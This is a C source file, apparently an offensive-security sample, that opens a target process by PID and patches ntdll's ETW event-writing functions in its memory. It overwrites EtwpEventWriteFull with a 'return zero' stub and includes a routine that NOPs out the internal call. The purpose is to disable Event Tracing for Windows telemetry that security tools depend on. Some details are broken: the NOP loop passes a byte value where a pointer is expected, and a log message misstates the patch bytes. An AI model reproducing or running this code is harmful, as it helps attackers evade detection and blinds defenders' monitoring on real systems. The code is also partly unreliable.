#include <Windows.h>
#include <stdio.h>

typedef enum PATCH
{
    PATCH_ETW_EVENTWRITE,
    PATCH_ETW_EVENTWRITE_FULL
} PATCH;

#define x64_CALL_INSTRUCTION_OPCODE            0xE8        // 'call'    - instruction opcode
#define x64_RET_INSTRUCTION_OPCODE            0xC3        // 'ret'    - instruction opcode
#define x64_INT3_INSTRUCTION_OPCODE            0xCC        // 'int3'    - instruction opcode
#define NOP_INSTRUCTION_OPCODE                0x90        // 'nop'    - instruction opcode

#define PATCH_SIZE                            0x05

BOOL PatchEtwpEventWriteFullCall(enum PATCH ePatch, HANDLE hProcess) {

    int i = 0;
    DWORD dwOldProtection = 0x00;
    PBYTE pEtwFuncAddress = NULL;

    // Get the address of "EtwEventWrite" OR "EtwEventWriteFull" based on 'ePatch'
    HMODULE hNtdll = GetModuleHandleA("NTDLL");
    pEtwFuncAddress = (PBYTE)GetProcAddress(hNtdll, ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull");
    if (!pEtwFuncAddress) {
        printf("[!] GetProcAddress failed with error %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Address Of \"%s\": 0x%p\n", ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull", pEtwFuncAddress);

    // A while-loop to find the last 'ret' instruction
    while (1) {
        if (pEtwFuncAddress[i] == x64_RET_INSTRUCTION_OPCODE && pEtwFuncAddress[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
            break;
        i++;
    }

    // Searching upwards for the 'call' instruction
    while (i) {
        if (pEtwFuncAddress[i] == x64_CALL_INSTRUCTION_OPCODE) {
            break;
        }
        i--;
    }

    // If the first opcode is not 'call', return false
    if (pEtwFuncAddress[i] != x64_CALL_INSTRUCTION_OPCODE)
        return FALSE;

    PBYTE pCallInstruction = pEtwFuncAddress + i;  // Move the pointer to the 'call' instruction

    printf("\t> \"call EtwpEventWriteFull\": 0x%p\n", pCallInstruction);
    printf("\t> Patching with \"90 90 90 90 90\" ... ");

    // Change memory permissions to RWX
    if (!VirtualProtectEx(hProcess, pCallInstruction, PATCH_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx [1] failed with error %d\n", GetLastError());
        return FALSE;
    }

    // Apply the patch - Replacing the 'call EtwpEventWriteFull' with 0x90 instructions
    for (int j = 0; j < PATCH_SIZE; j++) {
        if (!WriteProcessMemory(hProcess, pCallInstruction + j, NOP_INSTRUCTION_OPCODE, 1, NULL)) {
            printf("[!] WriteProcessMemory failed with error %d\n", GetLastError());
            return FALSE;
        }
    }

    // Change memory permissions to original
    if (!VirtualProtectEx(hProcess, pCallInstruction, PATCH_SIZE, dwOldProtection, &dwOldProtection)) {
        printf("[!] VirtualProtectEx [2] failed with error %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] DONE !\n\n");

    return TRUE;
}

// Get the address of 'EtwpEventWriteFull'
PVOID FetchEtwpEventWriteFull() {

    INT i = 0;
    PBYTE pEtwEventFunc = NULL;
    DWORD dwOffSet = 0x00;

    // Both "EtwEventWrite" OR "EtwEventWriteFull" will work
    pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
    if (!pEtwEventFunc)
        return NULL;
    printf("[+] pEtwEventFunc: 0x%0p\n", pEtwEventFunc);

    // A while-loop to find the last 'ret' instruction
    while (1) {
        if (pEtwEventFunc[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventFunc[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
            break;
        i++;
    }

    // Searching upwards for the 'call' instruction
    while (i) {
        if (pEtwEventFunc[i] == x64_CALL_INSTRUCTION_OPCODE) {
            break;
        }
        i--;
    }

    // If the first opcode is not 'call', return null
    if (pEtwEventFunc[i] != x64_CALL_INSTRUCTION_OPCODE)
        return NULL;

    PBYTE pCallInstruction = pEtwEventFunc + i;  // Move the pointer to the 'call' instruction

    printf("\t> \"call EtwpEventWriteFull\": 0x%p\n", pCallInstruction);

    // Skipping the 'E8' byte ('call' opcode)
    pCallInstruction++;

    // Fetching EtwpEventWriteFull's offset
    dwOffSet = *(DWORD*)pCallInstruction;
    printf("\t> Offset: 0x%0.8X\n", dwOffSet);

    // Adding the size of the offset to reach the end of the call instruction
    pCallInstruction += sizeof(DWORD);

    // Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
    pCallInstruction += dwOffSet;

    // pCallInstruction is now the address of EtwpEventWriteFull
    return (PVOID)pCallInstruction;
}

BOOL PatchEtwpEventWriteFullStart(HANDLE hProcess) {

    PVOID pEtwpEventWriteFull = NULL;
    DWORD dwOldProtection = 0x00;
    BYTE pShellcode[3] = {
        0x33, 0xC0,            // xor eax, eax
        0xC3                // ret
    };

    // Getting EtwpEventWriteFull address
    pEtwpEventWriteFull = FetchEtwpEventWriteFull();
    if (!pEtwpEventWriteFull)
        return FALSE;
    printf("[+] pEtwpEventWriteFull: 0x%p\n", pEtwpEventWriteFull);

    printf("\t> Patching with \"30 C0 C3\" ... ");

    // Change memory permissions to RWX
    if (!VirtualProtectEx(hProcess, pEtwpEventWriteFull, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx [1] failed with error %d\n", GetLastError());
        return FALSE;
    }

    // Apply the patch
    if (!WriteProcessMemory(hProcess, pEtwpEventWriteFull, pShellcode, sizeof(pShellcode), NULL)) {
        printf("[!] WriteProcessMemory failed with error %d\n", GetLastError());
        return FALSE;
    }

    // Change memory permissions to original
    if (!VirtualProtectEx(hProcess, pEtwpEventWriteFull, sizeof(pShellcode), dwOldProtection, &dwOldProtection)) {
        printf("[!] VirtualProtectEx [2] failed with error %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] DONE !\n\n");

    return TRUE;
}

int main(int argc, char* argv[]) {

    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return -1;
    }

    DWORD pid = atoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hProcess == NULL) {
        printf("[!] OpenProcess failed with error %d\n", GetLastError());
        return -1;
    }

    PatchEtwpEventWriteFullStart(hProcess);

    printf("[#] Press <Enter> To Quit ... ");

    CloseHandle(hProcess);
    return 0;
}
